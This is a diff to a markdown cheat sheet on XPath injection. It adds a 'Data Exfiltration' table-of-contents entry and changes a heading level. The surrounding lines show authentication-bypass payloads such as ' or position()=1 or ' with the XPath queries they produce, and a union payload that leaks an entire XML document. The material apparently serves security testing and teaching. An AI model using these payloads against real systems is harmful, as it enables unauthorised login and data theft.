@@ -6,6 +6,7 @@
     - [Wildcards & Union](#wildcards--union)
 - [Cheat Sheet](#cheat-sheet)
   - [Authentication Bypass](#authentication-bypass)
+  - [Data Exfiltration](#data-exfiltration)
 
 
 
@@ -136,7 +137,7 @@
 |Bypass Authentication by position| 	`' or position()=1 or '`| 	`/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
 |Bypass Authentication by substring| 	`' or contains(.,'admin') or '`| 	`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
 
-## Data Exfiltration
+### Data Exfiltration
 
 - Unrestricted:
   - Leak entire XML document via union injection: `| //text()`
